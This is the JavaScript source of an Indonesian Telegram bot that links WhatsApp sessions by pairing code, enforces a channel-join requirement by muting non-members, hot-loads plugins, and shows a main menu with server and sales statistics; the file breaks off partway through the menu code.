const config = require("./config");
const { BOT_TOKEN } = require("./config");
const { Telegraf, Markup, session } = require("telegraf");
const axios  = require("axios");
const path   = require("path");
const fs     = require("fs");
const moment = require("moment-timezone");
const P      = require("pino");
const chalk  = require("chalk");
const util   = require("util");
const crypto = require("crypto");
const fetch  = require("node-fetch");
const {
        default: makeWASocket,
        useMultiFileAuthState,
        useSingleFileAuthState,
        downloadContentFromMessage,
        downloadAndSaveMediaMessage,
        emitGroupParticipantsUpdate,
        emitGroupUpdate,
        generateWAMessageContent,
        generateWAMessage,
        generateWAMessageFromContent,
        makeInMemoryStore,
        initInMemoryKeyStore,
        prepareWAMessageMedia,
        fetchLatestBaileysVersion,
        jidDecode,
        mentionedJid,
        processTime,
        getStream,
        getContentType,
        isBaileys,
        relayWAMessage,
        MediaType,
        MessageType,
        Mimetype,
        Presence,
        DisconnectReason,
        ReconnectMode,
        WAFlag,
        WAMetric,
        ChatModification,
        MessageTypeProto,
        WA_MESSAGE_STATUS_TYPE,
        WA_MESSAGE_STUB_TYPES,
        WA_DEFAULT_EPHEMERAL,
        GroupSettingChange,
        AnyMessageContent,
        templateMessage,
        InteractiveMessage,
        MessageOptions,
        MiscMessageGenerationOptions,
        WASocket,
        BaileysError,
        MediaConnInfo,
        WAUrlInfo,
        WAMediaUpload,
        Browser,
        Browsers,
        ProxyAgent,
        proto,
        WAProto,
        WAMessageProto,
        WAMessageContent,
        WAMessage,
        WAContextInfo,
        WATextMessage,
        WAContactMessage,
        WAContactsArrayMessage,
        WALocationMessage,
        WAGroupInviteMessage,
        Header,
        GroupMetadata,
        WAGroupMetadata,
        AuthenticationState,
        BufferJSON,
        areJidsSameUser,
        WAMessageStatus,
        URL_REGEX,
        MimetypeMap,
        MediaPathMap,
        WANode,
        waChatKey,
} = require("@whiskeysockets/baileys");

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));


const PREMIUM_FILE = path.join(__dirname, "premium.json"); // sejajar index.js


global.apiAkunDigitalOcean = config.apiAkunDigitalOcean;
const GITHUB_TOKEN_LIST_URL = config.githubToken;
const nodeScript   = "v20.20.0";

const bot = new Telegraf(config.BOT_TOKEN); // sekarang aman
const ownerIds = config.ownerIds || [];


const userDB = path.join(__dirname, "db", "users.json");


if (!fs.existsSync(userDB)) {
        fs.writeFileSync(userDB, "[]");
}


const loadUsers = () => JSON.parse(fs.readFileSync(userDB));
const saveUsers = (d) => fs.writeFileSync(userDB, JSON.stringify(d, null, 2));


const getBotStats = (db) => {
        const totalUser = db.length;


        let totalTransaksi = 0;
        let totalPemasukan = 0;


        for (const user of db) {
                totalPemasukan += user.total_spent || 0;
                totalTransaksi += user.history?.length || 0;
        }


        return {
                totalUser,
                totalTransaksi,
                totalPemasukan,
        };
};

function generateRandomPassword(length = 12) {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

        return Array.from(
                { length },
                () => chars[Math.floor(Math.random() * chars.length)]
        ).join("");
}


function loadJson(filePath) {
        try {
                if (!fs.existsSync(filePath)) return {};

                const raw = fs.readFileSync(filePath, "utf8"); // PENTING: utf8
                if (!raw.trim()) return {};

                const data = JSON.parse(raw);

                return data && typeof data === "object" && !Array.isArray(data) ? data : {};
        } catch (e) {
                console.log("❌ loadJson error:", e.message);
                return {};
        }
}


function saveJson(filePath, data) {
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
}


function isOwnerId(userId) {
        return (config.ownerIds || []).map(String).includes(String(userId));
}


function isPremiumNow(userId) {
        const id = String(userId);
        const premiumUsers = loadJson(PREMIUM_FILE);
        const iso = premiumUsers[id];

        if (!iso) return false;

        const exp = new Date(iso).getTime();
        if (!Number.isFinite(exp)) return false;

        return exp > Date.now();
}


let bots = [];
let isWhatsAppConnected = false;



//========================================================\\ 
async function fetchValidTokens() {
        try {
                const response = await axios.get(GITHUB_TOKEN_LIST_URL);
                return response.data;
        } catch (error) {
                console.error(
                        chalk.red("Gagal mengambil token database di GitHub!"),
                        error.message
                );
                return [];
        }
}


async function validateToken() {
        console.log(chalk.blue("Loading Check Token Bot..."));

        const validTokens = await fetchValidTokens();

        if (!validTokens.tokens || !Array.isArray(validTokens.tokens)) {
                console.log(chalk.red("Data token tidak valid dari GitHub!"));
                process.exit(1);
        }

        if (!validTokens.tokens.includes(config.BOT_TOKEN)) {
                console.log(chalk.red("Yah penyusub ajg"));
                process.exit(1);
        }

        console.log(chalk.bold.white("✅ Token Valid! Menyiapkan Bot...\n"));
}


bot.use(
        session({
                defaultSession: () => ({}), // Initialize empty session object
        })
);


const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const todayFile = path.join(__dirname, "./data/user_today.json");


let sock = null;
let linkedWhatsAppNumber = "";
const usePairingCode = true;


function getTodayDate() {
        return new Date().toISOString().slice(0, 10);
}


const totalPlugins = countTotalPlugins();
const { DateTime } = require("luxon");


async function sendStartEffect(ctx) {
        try {
                // 1) typing dulu
                await ctx.sendChatAction("typing");
                await sleep(200);

                // 2) kirim sticker loading
                const stickerMsg = await ctx.replyWithSticker(config.stickers.loading);

                // 3) tunggu bentar biar keliatan keren
                await sleep(750);

                // 4) hapus sticker biar efek ilang
                await ctx.telegram.deleteMessage(ctx.chat.id, stickerMsg.message_id);

                // 5) tampilkan menu utama kamu
                await ctx.sendChatAction("upload_photo");
                await sleep(200);
        } catch (err) {
                console.log("Start Effect Error:", err);
        }
}


function countTotalPlugins() {
        let total = 0;

        ["plugins", "plugins2"].forEach((dir) => {
                const folder = path.join(__dirname, dir);
                if (!fs.existsSync(folder)) return;

                total += fs.readdirSync(folder).filter((f) => f.endsWith(".js")).length;
        });

        return total;
}


function formatBytes(bytes) {
        if (!bytes || bytes <= 0) return "0 B";

        const units = ["B", "KB", "MB", "GB", "TB"];
        let i = 0;
        let num = bytes;

        while (num >= 1024 && i < units.length - 1) {
                num /= 1024;
                i++;
        }

        return `${num.toFixed(2)} ${units[i]}`;
}


function readFirstExisting(paths) {
        for (const p of paths) {
                try {
                        if (fs.existsSync(p)) {
                                return fs.readFileSync(p, "utf8").trim();
                        }
                } catch {}
        }
        return null;
}


// Pterodactyl/Docker container memory usage + limit (cgroup v2 & v1)
function getCgroupMemory() {
        // cgroup v2
        const usageV2 = readFirstExisting(["/sys/fs/cgroup/memory.current"]);
        const limitV2 = readFirstExisting(["/sys/fs/cgroup/memory.max"]);

        if (usageV2) {
                const usage = Number(usageV2);
                const limit = limitV2 === "max" || !limitV2 ? null : Number(limitV2);
                return { usage, limit, version: 2 };
        }

        // cgroup v1
        const usageV1 = readFirstExisting([
                "/sys/fs/cgroup/memory/memory.usage_in_bytes",
        ]);
        const limitV1 = readFirstExisting([
                "/sys/fs/cgroup/memory/memory.limit_in_bytes",
        ]);

        if (usageV1) {
                const usage = Number(usageV1);
                // kadang limit v1 suka angka gede banget (unlimited), kita treat unlimited kalau > 1 PB
                const rawLimit = limitV1 ? Number(limitV1) : null;
                const limit = rawLimit && rawLimit < 1024 ** 5 ? rawLimit : null;
                return { usage, limit, version: 1 };
        }

        return null;
}


// CPU usage proses (buat indikator ringan, bukan limit panel)
let _lastCpu = process.cpuUsage();
let _lastTime = Date.now();


function getCpuPercent() {
        const now = Date.now();
        const diffTimeMs = Math.max(1, now - _lastTime);

        const cpuDiff = process.cpuUsage(_lastCpu);
        _lastCpu = process.cpuUsage();
        _lastTime = now;

        const usedMicros = cpuDiff.user + cpuDiff.system;
        const totalMicros = diffTimeMs * 1000; // ms -> microseconds
        const percentOneCore = (usedMicros / totalMicros) * 100;

        // normalisasi ke semua core biar ga gampang >100 di mesin multicore
        const cores = require("os").cpus()?.length || 1;
        const normalized = percentOneCore / cores;

        return Math.max(0, Math.min(999, normalized));
}


//~ Date Now
function getCurrentDate() {
        const now = new Date();
        const options = {
                weekday: "long",
                year: "numeric",
                month: "long",
                day: "numeric",
        };
        return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}


const question = (query) =>
        new Promise((resolve) => {
                const rl = require("readline").createInterface({
                        input: process.stdin,
                        output: process.stdout,
                });

                rl.question(query, (answer) => {
                        rl.close();
                        resolve(answer);
                });
        });


function saveActiveSessions(botNumber) {
        try {
                const sessions = [];

                if (fs.existsSync(SESSIONS_FILE)) {
                        const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));

                        if (!existing.includes(botNumber)) {
                                sessions.push(...existing, botNumber);
                        }
                } else {
                        sessions.push(botNumber);
                }

                fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
        } catch (error) {
                console.error("Error saving session:", error);
        }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));

      console.log(
        chalk.gray("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") +
          "\n" +
          chalk.cyan.bold("🚀 WHATSAPP SESSION MANAGER INITIALIZED") +
          "\n" +
          chalk.gray("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") +
          "\n" +
          chalk.white("📌 Active Sessions Found : ") +
          chalk.yellow.bold(String(activeNumbers.length)) +
          "\n" +
          chalk.gray("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
      );

      for (const botNumber of activeNumbers) {
        console.log(
          chalk.gray("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") +
            "\n" +
            chalk.blue.bold("🔄 CONNECTING WHATSAPP CLIENT") +
            "\n" +
            chalk.gray("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") +
            "\n" +
            chalk.white("📞 Number : ") +
            chalk.cyan(String(botNumber)) +
            "\n" +
            chalk.white("⏳ Status : ") +
            chalk.yellow("Initializing connection...") +
            "\n" +
            chalk.gray("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        );

        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;

            // ✅ CONNECTED
            if (connection === "open") {
              console.log(
                chalk.gray("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") +
                  "\n" +
                  chalk.green.bold("✅ WHATSAPP CONNECTED SUCCESSFULLY") +
                  "\n" +
                  chalk.gray("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") +
                  "\n" +
                  chalk.white("📞 Number : ") +
                  chalk.cyan(String(botNumber)) +
                  "\n" +
                  chalk.white("🟢 Status : ") +
                  chalk.green.bold("Online & Ready") +
                  "\n" +
                  chalk.gray("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
              );

              sessions.set(botNumber, sock);
              resolve();
            }

            // ❌ DISCONNECTED
            else if (connection === "close") {
              isWhatsAppConnected = false;

              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;

              // 🔄 RECONNECT
              if (shouldReconnect) {
                console.log(
                  chalk.gray("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") +
                    "\n" +
                    chalk.keyword("orange").bold(
                      "⚠️ CONNECTION LOST - RECONNECTING..."
                    ) +
                    "\n" +
                    chalk.gray("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") +
                    "\n" +
                    chalk.white("📞 Number : ") +
                    chalk.cyan(String(botNumber)) +
                    "\n" +
                    chalk.white("🔄 Action : ") +
                    chalk.keyword("orange")("Attempting automatic reconnect") +
                    "\n" +
                    chalk.gray("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                );

                await initializeWhatsAppConnections();
              }

              // 🚫 LOGGED OUT
              else {
                console.log(
                  chalk.gray("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") +
                    "\n" +
                    chalk.red.bold("❌ SESSION TERMINATED") +
                    "\n" +
                    chalk.gray("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") +
                    "\n" +
                    chalk.white("📞 Number : ") +
                    chalk.cyan(String(botNumber)) +
                    "\n" +
                    chalk.white("🚫 Reason : ") +
                    chalk.red("Logged Out / Connection Closed") +
                    "\n" +
                    chalk.gray("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                );

                reject(new Error("CONNECTION CLOSED"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error(
      chalk.gray("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") +
        "\n" +
        chalk.red.bold("🔥 WHATSAPP INITIALIZATION ERROR") +
        "\n" +
        chalk.gray("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") +
        "\n" +
        chalk.red(String(error?.message || error)) +
        "\n" +
        chalk.gray("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
    );
  }
}
function createSessionDir(botNumber) {
        const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);

        if (!fs.existsSync(deviceDir)) {
                fs.mkdirSync(deviceDir, { recursive: true });
        }

        return deviceDir;
}


// --- Koneksi WhatsApp ---
async function connectToWhatsApp(botNumber, ctx) {
        const chatId = ctx.chat.id;


        const sentMsg = await ctx.telegram.sendMessage(
                chatId,
                `<blockquote><b>🔰 WHATSAPP CONNECTION</b>

📌 <b>Number</b> : <code>${botNumber}</code>
⏳ <b>Status</b> : <i>Initializing...</i> ⚡

<i>Please wait while the session is being prepared.</i></blockquote>`,
                { parse_mode: "HTML" }
        );


        const statusMessage = sentMsg.message_id;


        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);


        const sock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
                logger: P({ level: "silent" }),
                defaultQueryTimeoutMs: undefined,
        });


        sock.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect } = update;


                if (connection === "close") {
                        const statusCode = lastDisconnect?.error?.output?.statusCode;


                        if (statusCode && statusCode >= 500 && statusCode < 600) {
                                await ctx.telegram.editMessageText(
                                        chatId,
                                        statusMessage,
                                        null,
                                        `<blockquote><b>🔄 RECONNECTING SESSION</b>

📌 <b>Number</b> : <code>${botNumber}</code>
⚠️ <b>Status</b> : <i>Connection lost...</i>

<b>System is retrying automatically.</b></blockquote>`,
                                        { parse_mode: "HTML" }
                                );


                                await connectToWhatsApp(botNumber, ctx);
                        } else {
                                await ctx.telegram.editMessageText(
                                        chatId,
                                        statusMessage,
                                        null,
                                        `<blockquote><b>❌ CONNECTION FAILED</b>

📌 <b>Number</b> : <code>${botNumber}</code>
🚫 <b>Status</b> : <b>Failed to connect</b>

<i>Session has been terminated.</i></blockquote>`,
                                        { parse_mode: "HTML" }
                                );


                                try {
                                        fs.rmSync(sessionDir, { recursive: true, force: true });
                                } catch (error) {
                                        console.error("Error deleting session:", error);
                                }
                        }
                } else if (connection === "open") {
                        sessions.set(botNumber, sock);
                        saveActiveSessions(botNumber);
                        isWhatsAppConnected = true;


                        await ctx.telegram.editMessageText(
                                chatId,
                                statusMessage,
                                null,
                                `<blockquote><b>✅ WHATSAPP CONNECTED</b>

📌 <b>Number</b> : <code>${botNumber}</code>
🟢 <b>Status</b> : <b>Online & Ready</b>

<i>Session successfully connected.</i></blockquote>`,
                                { parse_mode: "HTML" }
                        );
                } else if (connection === "connecting") {
                        await new Promise((resolve) => setTimeout(resolve, 1000));


                        try {
                                if (!fs.existsSync(`${sessionDir}/creds.json`)) {
                                        const code = await sock.requestPairingCode(botNumber, "DRAGON22");
                                        const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;


                                        await ctx.telegram.editMessageText(
                                                chatId,
                                                statusMessage,
                                                null,
                                                `<blockquote><b>🔑 PAIRING REQUIRED</b>

📌 <b>Number</b> : <code>${botNumber}</code>

✨ <b>Pairing Code</b> :
<code>${formattedCode}</code>

<i>Enter this code in WhatsApp to complete login.</i></blockquote>`,
                                                { parse_mode: "HTML" }
                                        );
                                }
                        } catch (error) {
                                console.error("Error requesting pairing code:", error);


                                await ctx.telegram.editMessageText(
                                        chatId,
                                        statusMessage,
                                        null,
                                        `<blockquote><b>⚠️ PAIRING ERROR</b>

📌 <b>Number</b> : <code>${botNumber}</code>
❌ <b>Reason</b> : <code>${error.message}</code>

<i>Please try again later.</i></blockquote>`,
                                        { parse_mode: "HTML" }
                                );
                        }
                }
        });


        sock.ev.on("creds.update", saveCreds);


        return sock;
}

function getWaktuSalam() {
        const hour = DateTime.now().setZone("Asia/Jakarta").hour;


if (hour >= 1 && hour <= 6) {
    return "Selamat dini hari 🌃";
} else if (hour >= 7 && hour <= 9) {
    return "Selamat pagi 🌆";
} else if (hour >= 10 && hour <= 14) {
    return "Selamat siang 🏖️";
} else if (hour >= 15 && hour <= 18) {
    return "Selamat sore 🌇";
} else if ((hour >= 19 && hour <= 23) || hour === 0) {
    return "Selamat malam 🌌";
} else {
    return "Selamat malam"; // fallback
}
}


function getUptime() {
        const seconds = process.uptime();

        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);

        return `${days} Hari ${hours} Jam ${minutes} Menit`;
}


function ensureTodayFile() {
        const today = getTodayDate();

        if (!fs.existsSync(todayFile)) {
                fs.writeFileSync(
                        todayFile,
                        JSON.stringify({ date: today, users: [] }, null, 2)
                );
        }

        const data = JSON.parse(fs.readFileSync(todayFile));

        if (data.date !== today) {
                fs.writeFileSync(
                        todayFile,
                        JSON.stringify({ date: today, users: [] }, null, 2)
                );
                return { date: today, users: [] };
        }

        return data;
}


function logUserToday(userId) {
        const data = ensureTodayFile();

        if (!data.users.includes(userId)) {
                data.users.push(userId);
                fs.writeFileSync(todayFile, JSON.stringify(data, null, 2));
        }
}


function getUserTodayCount() {
        const data = ensureTodayFile();
        return data.users.length;
}


async function notifyOwnerOnline() {
        const owners = config.ownerIds || [];

        for (const id of owners) {
                try {
                        await bot.telegram.sendMessage(
                                id,
                                "✅ Bot sudah aktif kembali dan online di panel!"
                        );
                        console.log(`✅ Notif berhasil dikirim ke owner ${id}`);
                } catch (err) {
                        console.error(
                                `❌ Gagal kirim notif ke ${id}:`,
                                err.description || err.message
                        );
                }
        }
}


async function checkJoinChannel(ctx) {
        try {
                const member = await ctx.telegram.getChatMember(
                        config.FORCE_SUB_CHANNEL,
                        ctx.from.id
                );
                return ["member", "administrator", "creator"].includes(member.status);
        } catch {
                return false;
        }
}


bot.use(async (ctx, next) => {
    if (!ctx.from || ctx.from.is_bot || !ctx.chat) return next();

    // ⛔️ PENTING: STOP DI CALLBACK (BIAR GA SPAM)
    if (ctx.callbackQuery) return next();

    // Bypass linked channel
    if (ctx.message?.sender_chat?.type === "channel") return next();

    const chatType = ctx.chat.type;
    const joined = await checkJoinChannel(ctx);

    // =====================
    // PRIVATE
    // =====================
    if (chatType === "private") {
        if (!joined) {
            return ctx.replyWithPhoto(
                { source: fs.createReadStream("./gambar/banner.png") },
                {
                    caption:
                        `<blockquote>` +
                        `<b>Halo ${ctx.from.first_name} 👋</b>\n` +
                        `Kamu harus join channel kami dulu ya\n` +
                        `untuk pakai bot ini.` +
                        `</blockquote>`,
                    parse_mode: "HTML",
                    ...Markup.inlineKeyboard([
                        [
                            Markup.button.url(
                                "📢 Join Channel",
                                `https://t.me/${config.FORCE_SUB_CHANNEL.replace(/^@/, "")}`
                            ),
                        ],
                        [
                            Markup.button.callback("✅ Cek Lagi", "check_sub"),
                        ],
                    ]),
                }
            );
        }
        return next();
    }

    // =====================
    // GROUP
    // =====================
    if (chatType === "group" || chatType === "supergroup") {
        if (!joined) {
            await ctx.restrictChatMember(ctx.from.id, {
                permissions: {
                    can_send_messages: false,
                    can_send_media_messages: false,
                    can_send_other_messages: false,
                    can_add_web_page_previews: false,
                },
                until_date: 0,
            });

            return ctx.reply(
                `<blockquote>
<b>${ctx.from.first_name}</b>, kamu belum join channel.
Kamu di-mute dulu ya sampai join.
</blockquote>`,
                {
                    parse_mode: "HTML",
                    ...Markup.inlineKeyboard([
                        [
                            Markup.button.url(
                                "📢 Join Channel",
                                `https://t.me/${config.FORCE_SUB_CHANNEL.replace(/^@/, "")}`
                            ),
                        ],
                        [
                            Markup.button.callback("🔓 Unmute Saya", "check_sub"),
                        ],
                    ]),
                }
            );
        }
        return next();
    }

    return next();
});


bot.action("check_sub", async (ctx) => {
    const joined = await checkJoinChannel(ctx);
    const chatType = ctx.chat.type;

    // =====================
    // PRIVATE CHAT
    // =====================
    if (chatType === "private") {

        // ❌ BELUM JOIN → POPUP SAJA
        if (!joined) {
            return ctx.answerCbQuery(
                "⚠️ Kamu belum join channel.\nSilakan join dulu ya.",
                { show_alert: true }
            );
        }

        // ✅ SUDAH JOIN
        await ctx.answerCbQuery("✅ Akses aktif");
        
        await sendStartEffect(ctx);

        await ctx.deleteMessage(); // hapus pesan force sub

        // kirim menu baru (seolah /start)
        return await sendMainMenu(ctx);
    }
    
// GROUP / SUPERGROUP → POPUP + UNMUTE
// =====================
if (chatType === "group" || chatType === "supergroup") {
    if (!joined) {
        // ❌ Belum join → popup tengah
        return ctx.answerCbQuery(
            `⚠️ ${ctx.from.first_name}, kamu belum join channel.\nSilakan join dulu ya.`,
            { show_alert: true }
        );
    }

    // ✅ Sudah join → unmute & popup sukses
    try {
        await ctx.restrictChatMember(ctx.from.id, {
            permissions: {
                can_send_messages: true,
                can_send_media_messages: true,
                can_send_other_messages: true,
                can_add_web_page_previews: true,
            },
        });
        
        await ctx.deleteMessage();

        return await ctx.answerCbQuery(
            `✅ ${ctx.from.first_name}, kamu sudah di-unmute dan bisa kirim pesan sekarang.`,
            { show_alert: true }
        );
    } catch (err) {
        console.error("Gagal unmute user:", err.response?.description || err);
    }

    return;
}
});

const pluginFolders = [
        path.join(__dirname, "plugins"),
        path.join(__dirname, "plugins2"),
];


let loadedUnloads = [];


function loadPlugins() {
    // Jalankan unload handler plugin lama dulu
    loadedUnloads.forEach((unload) => {
        try {
            unload();
        } catch (e) {
            console.error("[PLUGIN] Error saat unload plugin:", e);
        }
    });

    loadedUnloads = [];

    for (const folder of pluginFolders) {
        if (!fs.existsSync(folder)) continue;

        const pluginFiles = fs
            .readdirSync(folder)
            .filter((f) => f.endsWith(".js") && f !== "cache");

        for (const file of pluginFiles) {
            const pluginPath = path.join(folder, file);
            delete require.cache[require.resolve(pluginPath)];

            try {
                const plugin = require(pluginPath);

                if (typeof plugin === "function") {
                    const unload = plugin(bot); // asumsi bot didefinisikan global atau di luar

                    if (typeof unload === "function") {
                        loadedUnloads.push(unload);
                    }
                } else {
                    console.warn(`[PLUGIN] Plugin ${file} bukan fungsi`);
                }
            } catch (e) {
                console.error(
                    `[PLUGIN] Gagal load plugin ${file} dari ${folder}:`,
                    e
                );
            }
        }
    }
}


function readJSONSafe(file, fallback) {
        try {
                if (!fs.existsSync(file)) return fallback;

                const raw = fs.readFileSync(file, "utf8");
                if (!raw.trim()) return fallback;

                return JSON.parse(raw);
        } catch {
                return fallback;
        }
}


function rupiah(n) {
        const num = Number(n || 0);
        return "Rp" + num.toLocaleString("id-ID");
}


function buildCekStockCaption(stocks) {
        const categories = Object.keys(stocks || {});
        let out = `<blockquote><b>📦 ᴄᴇᴋ sᴛᴏᴄᴋ</b>\n`;


        if (!categories.length) {
                out += `\nStok sedang kosong.\n</blockquote>`;
                return out;
        }


        let hasAny = false;


        for (const cat of categories) {
                const items = Array.isArray(stocks[cat]) ? stocks[cat] : [];
                if (!items.length) continue;

                hasAny = true;
                out += `\n\n<b>━━━ ${String(cat).toUpperCase()} ━━━</b>`;


                items.slice(0, 50).forEach((it, i) => {
                        const name = it?.name || it?.paket || it?.plan || cat;
                        const desc = it?.description ? ` (${it.description})` : "";
                        const stockCount = Number(it?.stock ?? it?.qty ?? 0);
                        const price = rupiah(it?.price);

                        out +=
                                `\n├⌑ <b>${i + 1}.</b> ${name}${desc}` +
                                `\n│  ├💰 <b>${price}</b>` +
                                `\n│  └📦 stok: <b>${stockCount}</b>`;
                });
        }


        if (!hasAny) {
                out += `\n\nStok sedang kosong.\n</blockquote>`;
        } else {
                out += `\n</blockquote>`;
        }


        return out;
}

// Initial load
loadPlugins();

// Watcher reload kedua folder
const watchers = [];

let reloadTimeout;

for (const folder of pluginFolders) {
        if (!fs.existsSync(folder)) continue;

        const watcher = fs.watch(
                folder,
                { recursive: false },
                (eventType, filename) => {
                        if (!filename) return;
                        if (reloadTimeout) return;

                        reloadTimeout = setTimeout(() => {
                                console.log(
                                        "\x1b[0;32m[WATCHER]\x1b[1;32m Plugins folder updated!\x1b[0m"
                                );

                                reloadTimeout = null;

                                loadPlugins();
                        }, 2000);
                }
        );

        watchers.push(watcher);
}


// Command /start
bot.start(async (ctx) => {
    await sendStartEffect(ctx);

    const joined = await checkJoinChannel(ctx);

    if (!joined) {
        return ctx.replyWithPhoto(
            { source: fs.createReadStream("./gambar/welcome.jpg") },
            {
                caption:
                    `<blockquote>` +
                    `<b>Halo ${ctx.from.first_name} 👋</b>\n` +
                    `Kamu harus join channel kami dulu ya\n` +
                    `untuk bisa pakai bot ini.` +
                    `</blockquote>`,

                parse_mode: "HTML",

                ...Markup.inlineKeyboard([
                    Markup.button.url(
                        "📢 Join Channel",
                        `https://t.me/${config.FORCE_SUB_CHANNEL.replace(
                            /^@/,
                            ""
                        )}`
                    ),
                    Markup.button.callback(
                        "✅ Cek Lagi",
                        "check_sub"
                    ),
                ]),
            }
        );
    }

    logUserToday(ctx.from.id);

    return sendMainMenu(ctx);
});


bot.telegram.getMe().then((info) => {
        bot.botInfo = info;
});


const checkWhatsAppConnection = (ctx, next) => {
        if (!isWhatsAppConnected) {
                ctx.reply(
                        "❌ WhatsApp belum terhubung. Silakan hubungkan dengan Pairing Code terlebih dahulu."
                );
                return;
        }

        next();
};

// Fungsi utama untuk main menu
async function sendMainMenu(ctx) {
    const moment = require("moment-timezone");

    const wib  = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const wita = moment().tz("Asia/Makassar").format("HH:mm:ss");
    const wit  = moment().tz("Asia/Jayapura").format("HH:mm:ss");

    const username = ctx.from.first_name || "User";
    const userId   = ctx.from.id;

    const uptime = getUptime();
    const waktu  = getWaktuSalam();

    const cg = getCgroupMemory();
    const memPanelText = cg
        ? `${formatBytes(cg.usage)} / ${cg.limit ? formatBytes(cg.limit) : "Unlimited"}`
        : `${formatBytes(process.memoryUsage().rss)} / ?`;

    const cpuText    = `${getCpuPercent().toFixed(1)}%`;
    const totalToday = getUserTodayCount();
    const mention    = `<a href="tg://user?id=${ctx.from.id}">${ctx.from.first_name}</a>`;

    const db = loadUsers();
    const { totalUser, totalTransaksi, totalPemasukan } = getBotStats(db);

const caption = `<blockquote><b>Halo ${mention} 👋 ${waktu}  
Perkenalkan, saya <strong>${config.NAMA_BOT}</strong>, bot Telegram buatan ${config.NAMA_PEMBUAT}. Bot ini dibuat untuk membantu pengguna menjalankan berbagai fitur yang tersedia di dalam Telegram, seperti mengakses menu, melihat informasi, dan menggunakan perintah yang telah disediakan.</b></blockquote>
<blockquote><b>┏━━⧼ ʙᴏᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ⧽
┃ ⚝ ɢᴜɪᴅᴇ    : <a href="https://telegra.ph/Elika-Md-01-29">${config.NAMA_BOT}(Telegraph)</a>
┃ ⚝ ɴᴏᴅᴇ     : ${nodeScript}
┃ ⚝ ᴍᴇᴍᴏʀʏ   : ${memPanelText}
┃ ⚝ ᴄᴘᴜ      : ${cpuText}
┃ ⚝ ᴘʟᴜɢɪɴs  : ${totalPlugins}
┃ ⚝ ᴜᴘᴛɪᴍᴇ   : ${uptime}
┃ ⚝ ᴊᴀᴍ : ${wib}
╠━━━━⧼ ᴜsᴇʀ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ⧽
┃ ⚝ ᴜsᴇʀɴᴀᴍᴇ : @${ctx.from.username || "user"}
┃ ⚝ ᴜsᴇʀ ɪᴅ  : <code>${userId}</code>
╠━━━━⧼ ᴛɪᴍᴇ ɪɴғᴏ ⧽
┃ ⚝ ᴘᴇᴍᴀsᴜᴋᴀɴ : <strong>Rp${totalPemasukan.toLocaleString("id-ID")}</strong>
┃ ⚝ ᴜsᴇʀs   : <strong>${totalToday}</strong>
┃ ⚝ ᴛʀᴀɴsᴀᴋsɪ   : <strong>${totalUser}</strong>
┗━━━━━━━━━━━━━━━━◇</b></blockquote>
<blockquote><b>Owner: <a href="https://t.me/${config.OWNER_BOT}">${config.NAMA_DEPAN}</a></b></blockquote>
<blockquote><b>─Silakan gunakan tombol menu di bawah untuk mulai menggunakan fitur yang ada.</b></blockquote>`;

    await ctx.replyWithPhoto(
        { source: fs.createReadStream("./gambar/banner.png") },
        {
            caption,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "〔 ᴄʜᴀɴɴᴇʟ 〕", url: `https://t.me/${config.LINK_CHANNEL_BUTTON}` },
                        { text: "〔 ᴛǫᴛᴏ 〕", callback_data: "tqto" },
                    ],
                    [
                        { text: "〔 ᴏᴡɴᴇʀ ᴍᴇɴᴜ 〕", callback_data: "ownermenu" },
